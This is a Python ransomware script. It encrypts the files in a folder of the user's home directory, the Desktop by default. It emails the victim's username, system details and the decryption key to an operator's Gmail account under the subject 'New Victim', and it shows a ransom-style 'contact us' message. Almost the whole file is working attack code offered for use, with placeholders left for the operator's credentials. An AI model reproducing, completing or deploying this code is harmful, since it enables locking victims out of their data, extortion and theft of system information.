import argparse
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from dotenv import load_dotenv
import os
import re
import smtplib
import platform
import pathlib
import getpass
import PySimpleGUI as sg
 

def get_target_location(directory_name):
    folder_location = os.path.expanduser(f'~/{directory_name}')
    os.chdir(folder_location)
    return folder_location

def enum_directory_files(directory):   
    target_folder = get_target_location(directory)
    return [f for f in os.listdir(target_folder) if "." in f]

def trim_list_files(file_list):
    return [re.sub(r'^.*?\.', '.', file) for file in file_list]

def send_email():
    load_dotenv() 
    email_address = os.environ.get("gmail_account")
    password = os.environ.get("gmail_password")
    msg = MIMEMultipart()
    msg['Subject'] = 'New Victim - {}'.format(getpass.getuser())
    msg['From'] = email_address
    msg['to'] = email_address
    crypto_key = f'{pathlib.Path(__file__).parent.absolute()}/cryptographic_key.key'
    msg_body = (
        f'Username: {getpass.getuser()} \n'
        f'System: {platform.uname().system} \n'
        f'Node: {platform.uname().node} \n'
        f'Release: {platform.uname().release} \n'
        f'Version: {platform.uname().version} \n'
        f'Machine: {platform.uname().machine} \n'
        f'Processor: {platform.uname().processor} \n'
        f'Cryptographic Key: { open(crypto_key).read() } \n'
        )

    msg.attach(MIMEText(msg_body,'plain'))
    try:
        smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        smtp_server.ehlo()
        smtp_server.login(email_address, password)
        smtp_server.sendmail(email_address, email_address, msg.as_string())
        smtp_server.close()
        print("Email sent successfully!")
    except Exception as error_msg:
        print(f"An error occurred: {error_msg}")


def generate_key():
    key = Fernet.generate_key()
    with open('cryptographic_key.key', 'wb') as key_file:
        key_file.write(key)
    send_email()

def encrypt_files(file_list):
    with open(f'{pathlib.Path(__file__).parent.absolute()}/cryptographic_key.key', 'rb') as key_file:
        cryptographic_key = key_file.read()
    fernet = Fernet(cryptographic_key)
    if file_list:
        for document in file_list:
            with open(document, 'rb') as file:
                document_original = file.read()
            document_criptat = fernet.encrypt(document_original)
            with open(document, 'wb') as encrypted_document:
                encrypted_document.write(document_criptat)
        if main.args.backup == False:        
            os.remove(f'{pathlib.Path(__file__).parent.absolute()}/cryptographic_key.key') 
    else:
        print('No document in directory')


def decrypt_files(file_list, cryptographic_key):
    fernet = Fernet(cryptographic_key)
    for document in file_list:
        with open(document, 'rb') as file:
            document_criptat = file.read()
        document_decriptat = fernet.decrypt(document_criptat)
        with open(document, 'wb') as encrypted_document:
            encrypted_document.write(document_decriptat)

def main():
    gmail_account='<YOUR_GMAIL_ADDRESS>'
    gmail_password='<YOUR_GMAIL_PASSWORD>'


    parser = argparse.ArgumentParser(description=f'Your file has been encrypted Contact us {os.environ.get("gmail_account")} for futher details"')
    parser.add_argument('-k', '--key' , type=str, metavar='', help='add cryptographic key to decrypt the document')
    parser.add_argument('-b','--backup', help='add crypthographyc key to decrypt the document', action='store_true')
    parser.add_argument('-d', '--directory', type=str, metavar='', help='add cryptographic key to decrypt the document', default='Desktop')
    args = parser.parse_args()
    if args.key:
        directory = get_target_location(args.directory)
        documents = enum_directory_files(directory)
        decrypt_files(documents, args.key)
    else:
        generate_key()
        directory = get_target_location(args.directory)
        documents = enum_directory_files(directory)
        encrypt_files(documents)

if __name__ == "__main__":
    main()